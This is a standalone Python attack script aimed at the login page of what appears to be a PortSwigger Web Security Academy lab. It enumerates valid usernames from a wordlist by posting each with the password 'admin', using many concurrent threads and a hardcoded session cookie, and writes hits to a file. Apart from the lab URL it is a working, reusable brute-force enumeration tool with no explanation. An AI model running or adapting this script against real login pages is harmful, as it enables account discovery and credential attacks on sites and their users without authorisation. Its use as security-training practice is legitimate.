#!/usr/bin/env python3

import requests
import threading
import logging
from tqdm import tqdm

url = "https://0a6c00ee047b6dd180bfe45c00ee00c5.web-security-academy.net/login"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Cookie": "session=xKcvxM6E9Y115Ub0SElT47b3Oj3yagml",
}


def try_login(username, progress_bar):
    payload = {
        'username': username,
        'password': 'admin'
    }

    try:
        response = requests.post(url, headers=headers, data=payload, timeout=10)
        if "Invalid username" not in response.text:
            print(f"\nValid username: {username}")
            # Log valid usernames for future use (output to a file)
            with open("valid_usernames.txt", "a") as log_file:
                log_file.write(username + "\n")
        
    except requests.exceptions.RequestException as e:
        print(f"Error with username {username}: {e}")
    
    progress_bar.update(1)

def threaded_login(username, progress_bar):
    thread = threading.Thread(target=try_login, args=(username, progress_bar))
    thread.start()
    return thread

with open("usuarios_noborrar.txt", "r") as file:
    usernames = file.readlines()

usernames = [username.strip() for username in usernames]

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

threads = []

# PROGRESS BAR
with tqdm(total=len(usernames), desc="Enumerating usernames", ncols=100) as progress_bar:
    
    for username in usernames:
        thread = threaded_login(username, progress_bar)
        threads.append(thread)

    for thread in threads:
        thread.join()

logging.info("Username enumeration completed!")

